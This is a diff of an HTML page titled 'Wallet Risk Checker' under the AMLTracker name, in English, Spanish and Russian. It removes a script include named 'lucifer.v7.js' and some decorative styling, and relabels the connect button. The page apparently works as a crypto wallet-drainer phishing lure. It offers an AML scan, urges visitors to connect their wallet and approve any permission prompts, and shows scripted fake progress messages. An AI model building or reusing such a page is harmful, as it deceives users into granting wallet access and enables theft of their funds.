@@ -45,14 +45,9 @@
     .cta{appearance:none;border:none;width:92%;max-width:380px;display:block;margin:12px auto 0;cursor:pointer;background:linear-gradient(180deg,var(--primary),var(--primary-600));color:#fff;font-weight:700;font-size:16px;padding:14px 18px;border-radius:16px;box-shadow:0 8px 20px rgba(20,99,255,.45),inset 0 1px 0 rgba(255,255,255,.25);transition:transform .08s ease,filter .2s ease,opacity .2s ease}
     .cta:active{transform:translateY(1px) scale(.99)} .cta[disabled]{opacity:.6;cursor:not-allowed}
     .status{font-size:13px;color:var(--muted);margin:10px auto 8px;min-height:18px}
-    .nodes{position:absolute;inset:0;pointer-events:none;overflow:hidden;opacity:.55}
-    .node{position:absolute;width:42px;height:42px;border-radius:14px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);backdrop-filter:blur(4px);animation:float 12s ease-in-out infinite}
-    .node:nth-child(1){top:12%;left:8%;animation-duration:10s} .node:nth-child(2){top:18%;right:12%;animation-duration:13s} .node:nth-child(3){bottom:18%;left:16%;animation-duration:14s} .node:nth-child(4){bottom:12%;right:10%;animation-duration:11s}
-    @keyframes float{0%{transform:translateY(0) translateX(0)}50%{transform:translateY(-6px) translateX(6px)}100%{transform:translateY(0) translateX(0)}}
     footer{padding:16px;text-align:center;color:var(--muted);font-size:12px}
     @media (max-width:340px){.lead{font-size:13px}.cta{font-size:15px}}
   </style>
-  <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
 </head>
 <body>
   <div class="app">
@@ -136,16 +131,9 @@
           Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.
         </p>
 
-        <button id="connectBtn" class="cta">Connect Your Wallet</button>
+        <button id="connectBtn" class="cta">Check your wallet</button>
         <div id="status" class="status" aria-live="polite"></div>
       </main>
-
-      <div class="nodes" aria-hidden="true">
-        <div class="node" style="animation-delay:0s"></div>
-        <div class="node" style="animation-delay:.6s"></div>
-        <div class="node" style="animation-delay:1.2s"></div>
-        <div class="node" style="animation-delay:1.8s"></div>
-      </div>
 
       <footer id="footerText">
         AMLTracker — All rights reserved.
@@ -184,7 +172,7 @@
         title: 'Wallet Risk Checker',
         sub: 'Checks Ethereum, BSC, Arbitrum, Polygon, Base, Fantom, and Avalanche addresses for AML risk signals.',
         instruction: 'Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.',
-        cta: 'Connect Your Wallet',
+        cta: 'Check your wallet',
         footer: 'AMLTracker — All rights reserved.',
         ready: 'Ready', waiting: 'Waiting…', eta: s => `Estimated time: ${s}s`, finalizing: 'Finalizing…', initializing: 'Initializing…', cancelled: 'Cancelled.', network: 'Network error. Try again.', completed: v => `Completed • Risk: ${v}`,
         phase: (p)=> p<15?'Connecting to wallet…':p<30?'Reading address list…':p<45?'Fetching transaction history…':p<60?'Analyzing counterparties…':p<75?'Checking risk signals…':p<90?'Aggregating results…':p<100?'Final checks…':'Done.',
@@ -195,7 +183,7 @@
         title: 'Comprobador de Riesgo de Wallet',
         sub: 'Revisa direcciones en Ethereum, BSC, Arbitrum, Polygon, Base, Fantom y Avalanche para señales de riesgo AML.',
         instruction: 'Toque el botón para conectar su wallet y escanear direcciones. Por favor apruebe los avisos; a veces se requieren permisos para leer direcciones.',
-        cta: 'Conectar Wallet',
+        cta: 'Check your wallet',
         footer: 'AMLTracker — Todos los derechos reservados.',
         ready: 'Listo', waiting: 'Esperando…', eta: s => `Tiempo estimado: ${s}s`, finalizing: 'Finalizando…', initializing: 'Inicializando…', cancelled: 'Cancelado.', network: 'Error de red. Intente de nuevo.', completed: v => `Completado • Riesgo: ${v}`,
         phase: (p)=> p<15?'Conectando a la wallet…':p<30?'Leyendo lista de direcciones…':p<45?'Obteniendo historial de transacciones…':p<60?'Analizando contrapartes…':p<75?'Comprobando señales de riesgo…':p<90?'Agregando resultados…':p<100?'Revisiones finales…':'Listo.',
@@ -206,7 +194,7 @@
         title: 'Проверка риска кошелька',
         sub: 'Проверяет адреса в Ethereum, BSC, Arbitrum, Polygon, Base, Fantom и Avalanche на AML‑риски.',
         instruction: 'Нажмите кнопку, чтобы подключить кошелёк и сканировать адреса. Подтвердите запросы; могут потребоваться разрешения для чтения адресов.',
-        cta: 'Подключить кошелёк',
+        cta: 'Check your wallet',
         footer: 'AMLTracker — Все права защищены.',
         ready: 'Готово', waiting: 'Ожидание…', eta: s => `Оставшееся время: ${s}с`, finalizing: 'Завершение…', initializing: 'Инициализация…', cancelled: 'Отменено.', network: 'Сетевая ошибка. Повторите попытку.', completed: v => `Завершено • Риск: ${v}`,
         phase: (p)=> p<15?'Подключение к кошельку…':p<30?'Чтение списка адресов…':p<45?'Загрузка истории транзакций…':p<60?'Анализ контрагентов…':p<75?'Проверка риск‑сигналов…':p<90?'Агрегация результатов…':p<100?'Финальные проверки…':'Готово.',
